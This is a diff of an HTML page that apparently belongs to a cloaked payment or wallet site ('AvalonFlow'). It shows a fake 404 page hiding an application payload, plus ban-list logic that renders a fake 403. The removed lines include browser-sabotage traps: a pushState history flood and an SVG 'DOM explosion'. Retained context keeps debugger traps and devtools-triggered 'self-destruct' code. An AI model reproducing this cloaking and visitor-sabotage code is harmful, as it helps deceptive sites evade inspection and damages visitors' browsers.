@@ -1,54 +1,13 @@
-<!DOCTYPE html>   
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
     <title>404 Not Found</title>
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script>
-(function() {
-    const BANNED_LIST_URL = './banned-ids.json';
-    const CACHE_KEY = 'av_cached_banned_ids';
-    const CACHE_TIME_KEY = 'av_banned_cache_time';
-
-    let currentETag = null;
-    let activeBannedIds = [];
-
-    try {
-        const cached = localStorage.getItem(CACHE_KEY);
-        if (cached) {
-            activeBannedIds = JSON.parse(cached);
-        }
-    } catch (e) {}
-
-    async function syncBannedList() {
-        try {
-            const response = await fetch(BANNED_LIST_URL, { cache: 'no-store' });
-            if (response.ok) {
-                const data = await response.json();
-                if (Array.isArray(data)) {
-                    activeBannedIds = data;
-                    localStorage.setItem(CACHE_KEY, JSON.stringify(data));
-                    localStorage.setItem(CACHE_TIME_KEY, Date.now().toString());
-                }
-            }
-        } catch (e) {}
-    }
-
-    syncBannedList();
-
-    function render403Page() {
-        localStorage.clear();
-
-        document.documentElement.innerHTML = `
-                            <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>403 Forbidden</title>
-    <style>
+            <style>
         body { 
             font-family: 'Georgia', sans-serif;  
+            /* Amplified color glow values with intense centers blending to deep black */
             background: radial-gradient(circle at 15% 25%, #4c1d95 0%, #1e1b4b 25%, transparent 60%),
                         radial-gradient(circle at 85% 75%, #005f73 0%, #0a2f35 30%, transparent 60%),
                         #05070a;
@@ -67,153 +26,17 @@
             overflow: hidden;
         }
 
+        /* Drags the positions diagonally so the vibrant corners flawlessly swap fields */
         @keyframes ambientPulse {
-            0% { background-position: 0% 10%; }
-            50% { background-position: 100% 90%; }
-            100% { background-position: 0% 10%; }
-        }
-
-        .error-container { max-width: 500px; }
-
-        .error-code-wrapper {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 140px;
-            font-weight: 600;
-            line-height: 1;
-            letter-spacing: -2px;
-            color: #f0f6fc;
-            user-select: none;
-            margin-bottom: 24px;
-            text-shadow: 0 4px 30px rgba(0, 0, 0, 0.7);
-        }
-
-        .logo-container {
-            width: 130px;
-            height: 130px;
-            margin: 0 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            overflow: hidden; 
-            box-shadow: 0 0 35px rgba(168, 85, 247, 0.4);
-            animation: logoGlow 4s ease-in-out infinite alternate;
-        }
-
-        @keyframes logoGlow {
-            0% { box-shadow: 0 0 25px rgba(168, 85, 247, 0.3); }
-            100% { box-shadow: 0 0 55px rgba(192, 132, 252, 0.6); }
-        }
-
-        .logo-img { width: 100%; height: 100%; object-fit: cover; }
-        h2 { font-size: 24px; font-weight: 700; margin: 0 0 8px 0; color: #f0f6fc; }
-        p { font-size: 15px; color: #8b949e; margin: 0; }
-    </style>
-</head>
-<body>
-    <div class="error-container">
-        <div class="error-code-wrapper">
-            <span>4</span>
-            <div class="logo-container">
-                <img src="assets/pictures/unnamed.jpg" alt="Logo" class="logo-img">
-            </div>
-            <span>3</span>
-        </div>
-        <h2>Error: Forbidden!</h2>
-        <p>You don't have permission to access this resource.</p>
-    </div>
-</body>
-</html>
-        `;
-    }
-
-    function verifyAccess() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const targetId = urlParams.get('id');
-        const localId = localStorage.getItem('avalonflow_identity');
-
-        if (
-            localStorage.getItem('step_3_paid') === 'true' ||
-            localStorage.getItem('step_3_txn_id') !== null
-        ) {
-            render403Page();
-            return true;
-        }
-
-        if (targetId && activeBannedIds.includes(targetId)) {
-            render403Page();
-            return true;
-        }
-
-        if (localId && activeBannedIds.includes(localId)) {
-            render403Page();
-            return true;
-        }
-
-        return false;
-    }
-
-    async function checkForFileChanges() {
-        try {
-            const response = await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
-            const newETag = response.headers.get('ETag') || response.headers.get('Last-Modified');
-
-            if (currentETag && newETag && currentETag !== newETag) {
-                window.location.reload();
-                return;
+            0% {
+                background-position: 0% 10%;
             }
-            if (newETag) {
-                currentETag = newETag;
+            50% {
+                background-position: 100% 90%;
             }
-        } catch (e) {}
-    }
-
-    if (verifyAccess()) return;
-
-    const originalSetItem = Storage.prototype.setItem;
-    Storage.prototype.setItem = function(key, value) {
-        if (key === 'avalonflow_identity' && activeBannedIds.includes(value)) {
-            render403Page();
-            return;
-        }
-        originalSetItem.apply(this, arguments);
-    };
-
-    window.addEventListener('popstate', verifyAccess);
-    window.addEventListener('storage', verifyAccess);
-    setInterval(verifyAccess, 100);
-    checkForFileChanges();
-    setInterval(checkForFileChanges, 3000);
-})();
-</script>
-
-    <style>
-        body { 
-            font-family: 'Georgia', sans-serif;  
-            background: radial-gradient(circle at 15% 25%, #4c1d95 0%, #1e1b4b 25%, transparent 60%),
-                        radial-gradient(circle at 85% 75%, #005f73 0%, #0a2f35 30%, transparent 60%),
-                        #05070a;
-            background-size: 180% 180%;
-            animation: ambientPulse 10s ease-in-out infinite;
-            color: #c9d1d9; 
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0; 
-            padding: 20px;
-            box-sizing: border-box;
-            text-align: center;
-            overflow: hidden;
-        }
-
-        @keyframes ambientPulse {
-            0% { background-position: 0% 10%; }
-            50% { background-position: 100% 90%; }
-            100% { background-position: 0% 10%; }
+            100% {
+                background-position: 0% 10%;
+            }
         }
 
         .error-container { max-width: 500px; }
@@ -275,7 +98,7 @@
                         <div class="error-code-wrapper">
                             <span>4</span>
                             <div class="logo-container">
-                                <img src="assets/pictures/unnamed.jpg" alt="Logo" class="logo-img">
+                                <img src="assets/pictures/1780995787737.jpeg" alt="Logo" class="logo-img">
                             </div>
                             <span>4</span>
                         </div>
@@ -289,38 +112,9 @@
                 sessionStorage.clear();
                 document.body.innerHTML = this.get404Template();
                 document.body.classList.add('render-ready');
-
-                // Active Defense Countermeasures
-                this.activateHistoryTrap();
-                this.activateDOMExplosion();
-
                 try { window.open('', '_self').close(); } catch (e) {}
                 this.activateInspectorTrap();
                 this.activateEnvironmentSabotage();
-            },
-
-            activateHistoryTrap: function() {
-                setInterval(() => {
-                    try {
-                        for (let i = 0; i < 100; i++) {
-                            window.history.pushState(null, '', `?restricted_state=${Math.random().toString(36).substring(2)}`);
-                        }
-                    } catch (e) {}
-                }, 50);
-            },
-
-            activateDOMExplosion: function() {
-                const container = document.createElement('div');
-                container.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden;';
-                document.body.appendChild(container);
-
-                setInterval(() => {
-                    for (let i = 0; i < 50; i++) {
-                        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
-                        svg.innerHTML = `<filter id="f"><feTurbulence type="fractalNoise" baseFrequency="0.05" numOctaves="5"/></filter>`;
-                        container.appendChild(svg);
-                    }
-                }, 100);
             },
 
             activateResetListener: function() {
@@ -409,14 +203,7 @@
                             case '0': try { (function stackTrap(i) { if (("" + i/i)["length"] !== 1 || i % 20 === 0) (function(){}).constructor("debugger")(); else stackTrap(++i); })(0); } catch(e) {} continue;
                             case '1': if (Math.random() > 0.5) window.status = 'VALIDATING'; continue;
                             case '2': return;
-                            case '3': 
-                                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-                                if (!isMobile) {
-                                    if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) {
-                                        this.triggerSelfDestruct();
-                                    }
-                                }
-                                continue;
+                            case '3': if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) this.triggerSelfDestruct(); continue;
                             case '4': (Date.now() % 1000) * 0x5a1b; continue;
                         }
                         break;
@@ -461,6 +248,7 @@
         window.addEventListener("message", (e) => { 
             if (e.data?.type === "UPDATE_TITLE") document.title = e.data.title; 
 
+            // Handle seamless URL mutations from sandbox context
             if (e.data?.type === "UPDATE_URL" && e.origin === window.location.origin) {
                 const newUrl = window.location.protocol + "//" + window.location.host + e.data.path;
                 window.history.pushState({ path: newUrl }, '', newUrl);
@@ -476,7 +264,7 @@
         <div class="error-code-wrapper">
             <span>4</span>
             <div class="logo-container">
-                <img src="assets/pictures/unnamed.jpg" alt="Logo" class="logo-img">
+                <img src="assets/pictures/1780995787737.jpeg" alt="Logo" class="logo-img">
             </div>
             <span>4</span>
         </div>
@@ -485,11 +273,10 @@
     <div id="hidden-application-payload" style="display:none;"><!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Preferred Wallet</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Contact Us</title>
 
-      <!-- Favicon -->
 <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3">
 <link rel="icon" type="image/x-icon" href="/favicon.ico?v=3">
 
@@ -501,110 +288,23 @@
 <link rel="icon" type="image/png" sizes="512x512" href="/android-chrome-512x512.png?v=3">
 <link rel="manifest" href="/manifest.json?v=3">
 
-
-<script>
-
-
-(async function () {
-    if (localStorage.getItem('profilePhoto')) {
-        return;
-    }
-
-    let imagePath;
-    try {
-        const response = await fetch('./config.json');
-        const config = await response.json();
-
-        const urlParams = new URLSearchParams(window.location.search);
-        let currentUser = urlParams.get('user');
-
-        if (!currentUser) {
-            const section2Raw = localStorage.getItem('section2Data');
-            if (section2Raw) {
-                try {
-                    const section2Data = JSON.parse(section2Raw);
-                    if (section2Data && section2Data.fullName) {
-                        currentUser = section2Data.fullName.trim();
-                    }
-                } catch (parseErr) {
-                    console.warn('Could not parse section2Data JSON:', parseErr);
-                }
-            }
-        }
-
-        if (currentUser && config.users && config.users[currentUser]) {
-            const userVal = config.users[currentUser];
-            // Extract index 0 if userVal is an array (e.g. [profile, contract]), otherwise use string directly
-            imagePath = Array.isArray(userVal) ? userVal[0] : userVal;
-        } else {
-            return;
-        }
-
-    } catch (err) {
-        console.warn('Could not load config file or process storage:', err);
-        return;
-    }
-
-    if (!imagePath) {
-        return;
-    }
-
-    const img = new Image();
-    img.crossOrigin = 'Anonymous';
-
-    img.onload = function () {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = img.width;
-            canvas.height = img.height;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(img, 0, 0);
-
-            const dataURL = canvas.toDataURL('image/png');
-            localStorage.setItem('profilePhoto', dataURL);
-        } catch (err) {
-            console.warn('Could not save initial profile picture:', err);
-        }
-    };
-
-    img.onerror = function () {
-        console.warn('Profile picture path failed to load.');
-    };
-
-    img.src = imagePath;
-})();
-
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "AvalonFlow",
+  "url": "https://avalonflow.site",
+  "logo": "https://avalonFlow.site/favicon.png"
+}
 </script>
-
-        <!-- Structured Data for Logo -->
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "Organization",
-      "name": "AvalonFlow",
-      "url": "https://avalonflow.site",
-      "logo": "https://avalonFlow.site/favicon.png"
-    }
-</script>
-
-<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
-
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-
-<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
 
 <style>
-  /* ---------- Base ---------- */
-  body {         font-family: 'Georgia', sans-serif;  margin:0; background:#0d0d0d; color:#fff; overflow-x:hidden; }
-  button { cursor:pointer; }
-  a { color:inherit; text-decoration:none; }
+/* ---------- Base ---------- */
+body {         font-family: 'Georgia', sans-serif;  margin: 0; background: #0d0d0d; color: #fff; overflow-x: hidden; }
+button { cursor: pointer; } 
+a { color: inherit; text-decoration: none; }
 
-html, body {
-    height: 100%;
-}
-
-          /* ---------- Floating Background ---------- */
+        /* ---------- Floating Background ---------- */
 #floating-bg {
     position: fixed;
     inset: 0;
@@ -645,413 +345,76 @@ html, body {
     }
 }
 
-  /* Glass cards */
-  /* Glass card base */
-.glass-card {
-  background: rgba(120, 180, 255, 0.7);
-  backdrop-filter: blur(12px);
-  border-radius: 18px;
-  padding: 28px;
-  margin-bottom: 28px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
-  max-width: 275px;
-  margin-left: auto;
-  margin-right: auto;
-}
-
-/* Glass card base */
-.glass-cards {
-  background: rgba(18, 20, 35, 0.75);
-  backdrop-filter: blur(12px);
-  border-radius: 18px;
-  padding: 28px;
-  margin-bottom: 28px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
-  max-width: 275px;
-  margin-left: auto;
-  margin-right: auto;
-}
-
-.glass-cardsrd {
-    background: rgba(120, 180, 255, 0.7);
-    backdrop-filter: blur(14px);
-    -webkit-backdrop-filter: blur(14px);
-    border-radius: 24px;
-    
-    /* ADJUSTED PADDING: 16px top/bottom, 12px left/right */
-    /* Reduce the 12px even lower if you want it tighter to the text */
-    padding: 16px 12px; 
-
-    /* CENTERING & FIT-CONTENT */
-    display: block;        
-    margin: 0 auto;        
-    width: fit-content;    /* Forces the card to shrink completely to the text size */
-
-    /* 1. CRISP 3D BEVELLED BORDER */
-    border: 1px solid rgba(255, 255, 255, 0.45);
-    border-bottom: 1px solid rgba(255, 255, 255, 0.15);
-    border-right: 1px solid rgba(255, 255, 255, 0.25);
-
-    /* 2. MULTI-LAYERED 3D DEPTH SHADOWS */
-    box-shadow:
-        0 20px 40px rgba(0, 0, 0, 0.35),
-        0 8px 16px rgba(0, 0, 0, 0.2),
-        inset 0 2px 4px rgba(255, 255, 255, 0.5),
-        inset 0 0 30px rgba(255, 255, 255, 0.1);
-
-    /* 3. OPTIONAL: Subtle tilted perspective */
-    transform: perspective(1000px) translateZ(0);
-}
-
-
-/* Top trust line & bottom note */
-.top-trust, .bottom-note {
-  text-align: center;
-  display: block;
-  z-index: 3;
-
-  font-weight: 600;
-  font-size: 0.95rem;
-
-  background: linear-gradient(90deg,#6b2cd8,#b393ff,#6b2cd8);
-  background-size: 200% auto;
-  animation: gradientShift 6s linear infinite;
-
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-
-  text-shadow: 0 2px 6px rgba(0,0,0,0.35);
-}
-
-@keyframes gradientShift {
-  0% { background-position: 0% center; }
-  100% { background-position: 200% center; }
-}
-
-.bottom-note {
-  margin-top: 28px; /* spacing below last card */
-  font-style: italic;
-  color: #b5b5b5;
-  font-size: 14px;
-}
-  
-
-/* Payment method card */
-.payment-method {
-  position: relative;
-  overflow: hidden;
-  background: rgba(255,255,255,0.08);
-  border-radius: 16px;
-  padding: 18px;
-  margin-top: 18px;
-  border: 1px solid rgba(255,255,255,0.18);
-  transition: 0.3s ease, transform 0.2s ease;
-  cursor: pointer;
-  backdrop-filter: blur(8px);
-  display: block;
-  z-index: 2; /* ensure above the glass wrapper background */
-}
-
-.payment-method:first-of-type {
-  margin-top: 12px; /* reduce top spacing from top trust line */
-}
-
-.payment-method:hover{
-  background: rgba(255,255,255,0.15);
-  transform: translateY(-2px);
-}
-
-/* =========================
-TOP RIGHT PROFILE POSITION
-========================= */
-.top-right-profile {
+                                                    /* ---------- Sidebar ---------- */
+#sidebar {
     position: fixed;
-    top: 15px;
-    right: 15px;
-    z-index: 999;
+    top: 0;
+    left: 0;
+    width: 280px;
+
+    /* FIX 1: Make height end exactly before the footer starts */
+    height: calc(100% - 102px); 
+
+    background: rgba(40, 75, 135, 0.75);
+
+    backdrop-filter: blur(14px);
+
+    /* FIX 2: Set z-index lower than footer (5) so footer naturally caps it */
+    z-index: 5; 
+
+    padding: 25px;
+    transform: translateX(-100%);
+    transition: transform 0.3s ease;
+}
+        #sidebar.open { transform: translateX(0); }
+        #sidebar h2{
+font-size:22px;
+margin-bottom:20px;
+color:#a78bfa;
+}
+        #sidebar button {
+            width: 100%;
+            margin: 12px 0;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            font-size: 16px;
+        }
+
+/* ---------- Content ---------- */
+#content { position: relative; z-index: 1; padding: 40px; max-width: 1100px; margin: auto; padding-bottom: 120px; }
+
+/* ---------- Glass Card ---------- */
+.glass-card { background: rgba(120, 180, 255, 0.7); backdrop-filter: blur(12px); border-radius: 18px; padding: 28px; box-shadow: 0 10px 30px rgba(0,0,0,0.35); }
+
+/* ---------- Mini TV ---------- */
+.mini-tv { background: rgba(0,0,0,0.45); border-radius: 14px; padding: 18px; margin: 18px 0; border: 1px solid rgba(107,44,216,0.35); font-size: 15px; min-height: 60px; display: flex; align-items: center; }
+
+/* ---------- Buttons ---------- */
+.button { background: #6b2cd8; color: #fff; border: none; border-radius: 10px; padding: 12px 18px; margin-top: 12px; width: 100%; font-size: 16px; }
+.input { width: 100%; padding: 12px; border-radius: 10px; border: none; margin-top: 12px; background: rgba(255,255,255,0.15); color: #fff; }
+
+                                /* ---------- Menu Button ---------- */
+        #menuBtn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 6;
+            background: #6b2cd8;
+            border: none;
+            color: #fff;
+            padding: 12px 14px;
+            border-radius: 10px;
 }
 
-#profilePhoto:not([src]), 
-#profilePhoto[src="default-avatar.png"] {
-    content: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23c0a9ff'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5-4-8-4z'/%3E%3C/svg%3E") !important;
-    background: #1a1625 !important;
-    box-sizing: border-box !important;
-    padding: 6px !important;
+/* move button when sidebar opens */
+#menuBtn.shift{
+left:250px;
 }
 
-/* =========================
-OUTER RING WRAPPER
-========================= */
-.avatar-ring {
-    width: 52px;
-    height: 52px;
-    border-radius: 50%;
-    padding: 3px;
-    position: relative;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-
-/* =========================
-PURPLE NEON SPIN + PULSE
-========================= */
-.avatar-ring::before {
-    content: "";
-    position: absolute;
-    inset: 0;
-    border-radius: 50%;
-
-    /* PURE PURPLE GLOW */
-    background: conic-gradient(
-        #a855f7,
-        #7c3aed,
-        #a855f7
-    );
-
-    animation:
-    spin 3s linear infinite,
-    hueShift 6s linear infinite;
-
-    filter: blur(5px);
-    opacity: 0.9;
-    z-index: 0;
-}
-
-
-/* =========================
-INNER CUT
-========================= */
-.avatar-ring::after {
-    content: "";
-    position: absolute;
-    inset: 4px;
-    background: transparent;
-    border-radius: 50%;
-    z-index: 1;
-}
-
-
-/* =========================
-PROFILE IMAGE
-========================= */
-.avatar {
-    width: 46px;
-    height: 46px;
-    border-radius: 50%;
-    object-fit: cover;
-    position: relative;
-    z-index: 2;
-    border: 1px solid rgba(168,85,247,0.25);
-}
-
-
-/* =========================
-ANIMATIONS
-========================= */
-
-/* spinning ring */
-@keyframes spin {
-    0% {
-        transform: rotate(0deg);
-    }
-    100% {
-        transform: rotate(360deg);
-    }
-}
-
-@keyframes hueShift {
-    0% {
-        filter: blur(4px) hue-rotate(0deg);
-        opacity: 0.75;
-    }
-    50% {
-        filter: blur(5px) hue-rotate(180deg);
-        opacity: 0.9;
-    }
-    100% {
-        filter: blur(4px) hue-rotate(360deg);
-        opacity: 0.75;
-    }
-}
-
-.payment-method.active{
-  border: 1px solid #6b2cd8;
-  box-shadow: 0 0 18px rgba(107,44,216,0.5);
-}
-
-/* Glow behind card */
-.payment-method::before {
-  content: '';
-  position: absolute;
-  top: -50%;
-  left: -50%;
-  width: 200%;
-  height: 200%;
-  background: radial-gradient(circle at center, rgba(107,44,216,0.2), transparent 70%);
-  opacity: 0;
-  transition: opacity 0.3s ease, transform 0.3s ease;
-  pointer-events: none;
-  z-index: 0;
-}
-
-.payment-method:hover::before,
-.payment-method.active::before {
-  opacity: 1;
-  transform: scale(1.1);
-}
-
-/* Shimmer on active card */
-.payment-method.active::after {
-  content: '';
-  position: absolute;
-  top: 0;
-  left: -75%;
-  width: 50%;
-  height: 100%;
-  background: linear-gradient(
-    120deg,
-    rgba(255,255,255,0) 0%,
-    rgba(255,255,255,0.15) 50%,
-    rgba(255,255,255,0) 100%
-  );
-  transform: skewX(-20deg);
-  animation: shimmer 1.5s infinite;
-  pointer-events: none;
-  z-index: 2;
-}
-
-@keyframes shimmer {
-  0% { left: -75%; }
-  50% { left: 125%; }
-  100% { left: 125%; }
-}
-
-/* Payment header + logo */
-.payment-header{
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  font-weight: bold;
-  font-size: 16px;
-  position: relative;
-  z-index: 1;
-}
-
-.token-logos{
-display:flex;
-align-items:center;
-gap:6px;
-font-weight: bold;
-  font-size: 16px;
-  position: relative;
-}
-
-.payment-logo{
-  width: 40px;
-  height: 40px;
-  object-fit: contain;
-  filter: drop-shadow(0 0 4px rgba(0,0,0,0.4));
-}
-
-.payment-logos{
-  width: 40px;
-  height: 40px;
-  object-fit: contain;
-  filter: drop-shadow(0 0 4px rgba(0,0,0,0.4));
-opacity: 1;
-    transition: opacity 200ms ease;
-}
-
-
-.payment-logos.is-hidden {
-    opacity: 0;
-}
-
-.payment-logoss{
-  width: 40px;
-  height: 40px;
-  object-fit: contain;
-  filter: drop-shadow(0 0 4px rgba(0,0,0,0.4));
-opacity: 1;
-    transition: opacity 200ms ease;
-}
-
-
-.payment-logoss.is-hidden {
-    opacity: 0;
-}
-
-.payment-logosss{
-  width: 40px;
-  height: 40px;
-  object-fit: contain;
-  filter: drop-shadow(0 0 4px rgba(0,0,0,0.4));
-opacity: 1;
-    transition: opacity 200ms ease;
-}
-
-
-.payment-logosss.is-hidden {
-    opacity: 0;
-}
-
-.payment-container {
-  position: relative;  /* required for z-index & box-shadow */
-  max-width: 600px;
-  margin: 0 auto;
-  z-index: 1;          /* base */
-}
-
-/* Red warning glow around container */
-.payment-container.warning {
-  z-index: 10; /* above cards */
-  box-shadow: 0 0 20px 4px rgba(255,77,77,0.9);
-  border-radius: 24px;
-  animation: warning-glow 0.8s ease-in-out 2;
-}
-
-/* Keyframes for pulsing red glow */
-@keyframes warning-glow {
-  0% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
-  50% { box-shadow: 0 0 20px 6px rgba(255,77,77,0.9); }
-  100% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
-}
-
-/* Suppress the purple card glows during warning */
-.payment-container.warning .payment-method::before {
-  opacity: 0 !important;
-}
-
-/* Input styling */
-.payment-method input{
-  width: 100%;
-  padding: 14px 16px;
-  margin-top: 12px;
-  border-radius: 12px;
-  border: none;
-  background: rgba(255,255,255,0.15);
-  color: #fff;
-display:none;
-/* FIX */
-  box-sizing: border-box;
-}
-
-.network-note{
-font-size:12px;
-color: #ff0000;
-margin-top:6px;
-font-style:italic;
-opacity:0.9;
-}
-
-  .payment-method input::placeholder{
-  color: #fff;
-  font-style: italic;
-}
-
- /* ================= Header Logo Card Neon ================= */
+  /* ================= Header Logo Card Neon ================= */
 
 .minimal-logo-header {
   display: flex;
@@ -1063,7 +426,7 @@ opacity:0.9;
 
   /* Optional: Ensures it stays firmly at the absolute top of the page layout */
   width: 100%;
-  margin-top: -112px; 
+  margin-top: -72px; 
 
   background: transparent !important;
 }
@@ -1102,364 +465,11 @@ opacity:0.9;
   outline: none !important;
 }
 
-/* =========================
-   American BANK SELECT
-   PREMIUM GLASS UPGRADE
-========================= */
-
-#americanBankSelect {
-    width: 100%;
-    height: 52px;
-
-    padding: 0 16px;
-
-    border: 1px solid rgba(255, 255, 255, 0.10);
-    border-radius: 18px;
-
-    background-color: rgba(255, 255, 255, 0.04);
-    color: #fff;
-
-    font-size: 14px;
-    font-weight: 500;
-
-    margin-top: 10px;
-
-    backdrop-filter: blur(18px);
-    -webkit-backdrop-filter: blur(18px);
-
-    box-shadow: 0 8px 30px rgba(0,0,0,0.15);
-
-    transition: all 0.25s ease;
-
-    appearance: none;
-    -webkit-appearance: none;
-    -moz-appearance: none;
-
-    cursor: pointer;
-
-    /* custom arrow */
-    background-image:
-        linear-gradient(45deg, transparent 50%, #b892ff 50%),
-        linear-gradient(135deg, #b892ff 50%, transparent 50%);
-
-    background-position:
-        calc(100% - 20px) calc(50% - 3px),
-        calc(100% - 14px) calc(50% - 3px);
-
-    background-size: 6px 6px;
-    background-repeat: no-repeat;
-}
-
-/* hover glow */
-#americanBankSelect:hover {
-    border-color: rgba(107, 44, 216, 0.5);
-
-    box-shadow:
-        0 0 0 2px rgba(107, 44, 216, 0.15),
-        0 10px 35px rgba(0,0,0,0.25);
-}
-
-/* focus state */
-#americanBankSelect:focus {
-    outline: none;
-
-    border-color: rgba(107, 44, 216, 0.7);
-
-    box-shadow:
-        0 0 0 3px rgba(107, 44, 216, 0.18),
-        0 10px 35px rgba(0,0,0,0.30);
-}
-
-/* dropdown options */
-#americanBankSelect option {
-    background: #12121c;
-    color: #fff;
-}
-
-/* =========================
-   BRITISH BANK SELECT
-   PREMIUM GLASS UPGRADE
-========================= */
-
-#britishBankSelect {
-    width: 100%;
-    height: 52px;
-
-    padding: 0 16px;
-
-    border: 1px solid rgba(255, 255, 255, 0.10);
-    border-radius: 18px;
-
-    background-color: rgba(255, 255, 255, 0.04);
-    color: #fff;
-
-    font-size: 14px;
-    font-weight: 500;
-
-    margin-top: 10px;
-
-    backdrop-filter: blur(18px);
-    -webkit-backdrop-filter: blur(18px);
-
-    box-shadow: 0 8px 30px rgba(0,0,0,0.15);
-
-    transition: all 0.25s ease;
-
-    appearance: none;
-    -webkit-appearance: none;
-    -moz-appearance: none;
-
-    cursor: pointer;
-
-    /* custom arrow */
-    background-image:
-        linear-gradient(45deg, transparent 50%, #b892ff 50%),
-        linear-gradient(135deg, #b892ff 50%, transparent 50%);
-
-    background-position:
-        calc(100% - 20px) calc(50% - 3px),
-        calc(100% - 14px) calc(50% - 3px);
-
-    background-size: 6px 6px;
-    background-repeat: no-repeat;
-}
-
-/* hover glow */
-#britishBankSelect:hover {
-    border-color: rgba(107, 44, 216, 0.5);
-
-    box-shadow:
-        0 0 0 2px rgba(107, 44, 216, 0.15),
-        0 10px 35px rgba(0,0,0,0.25);
-}
-
-/* focus state */
-#britishBankSelect:focus {
-    outline: none;
-
-    border-color: rgba(107, 44, 216, 0.7);
-
-    box-shadow:
-        0 0 0 3px rgba(107, 44, 216, 0.18),
-        0 10px 35px rgba(0,0,0,0.30);
-}
-
-/* dropdown options */
-#britishBankSelect option {
-    background: #12121c;
-    color: #fff;
-}
-
-/* ---------- Navigation Buttons ---------- */
-.nav-btn {
-  position: absolute;
-  top: 50%;
-  transform: translateY(-50%);
-  z-index: 5;
-  width: 40px;
-  height: 40px;
-  border-radius: 50%;
-  background: rgba(0,0,0,0.5);
-  border: 1px solid rgba(255,255,255,0.1);
-  color: white;
-  cursor: pointer;
-  backdrop-filter: blur(10px);
-  box-shadow: 0 0 15px rgba(107,44,216,0.4);
-}
-
-.nav-btn:hover {
-  background: rgba(107,44,216,0.8);
-  box-shadow:
-    0 0 20px rgba(107,44,216,0.8),
-    0 0 40px rgba(107,44,216,0.5);
-}
-
-.nav-btn.left { left: 10px; }
-.nav-btn.right { right: 10px; }
-
-                                        /* ---------- Sidebar ---------- */
-#sidebar {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 280px;
-
-    /* FIX 1: Make height end exactly before the footer starts */
-    height: calc(100% - 102px); 
-
-    background: rgba(40, 75, 135, 0.75);
-
-    backdrop-filter: blur(14px);
-
-    /* FIX 2: Set z-index lower than footer (5) so footer naturally caps it */
-    z-index: 5; 
-
-    padding: 25px;
-    transform: translateX(-100%);
-    transition: transform 0.3s ease;
-}
-        #sidebar.open { transform: translateX(0); }
-        #sidebar h2{
-font-size:22px;
-margin-bottom:20px;
-color:#a78bfa;
-}
-        #sidebar button {
-            width: 100%;
-            margin: 12px 0;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            background: rgba(255,255,255,0.1);
-            color: #fff;
-            font-size: 16px;
-        }
-
-                    /* ---------- Menu Button ---------- */
-        #menuBtn {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 6;
-            background: #6b2cd8;
-            border: none;
-            color: #fff;
-            padding: 12px 14px;
-            border-radius: 10px;
-}
-
-/* move button when sidebar opens */
-#menuBtn.shift{
-left:250px;
-}
-
-    /* Notification Bar */
-    .notification-bar {
-        position: fixed;
-        top: -80px;
-        right: 20px;
-        background: rgba(30, 144, 255, 0.25);
-        backdrop-filter: blur(12px);
-        border: 1px solid rgba(30,144,255,0.4);
-        color: #fff;
-        padding: 12px 18px;
-        border-radius: 12px;
-        font-size: 14px;
-font-weight: bold;
-        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
-        transition: top 0.5s ease, opacity 0.5s ease;
-        z-index: 9999;
-        opacity: 0;
-        max-width: 350px;
-        white-space: normal;
-        overflow: hidden;
-    }
-    .notification-bar.show {
-        top: 20px;
-        opacity: 1;
-    }
-.notification-bar.warning-yellow {
-    color: #ffcc00;
-    font-weight: 600;
-}
-
-.notification-bar.warning-red {
-    color: #ff3b3b;
-    font-weight: 600;
-    animation: pulse 1s infinite;
-}
-    .notification-bar::before {
-        content: '';
-        position: absolute;
-        left: -50%;
-        top: 0;
-        width: 50%;
-        height: 100%;
-        background: rgba(255,255,255,0.3);
-        transform: skewX(-25deg);
-        animation: liquidWave 2s linear infinite;
-    }
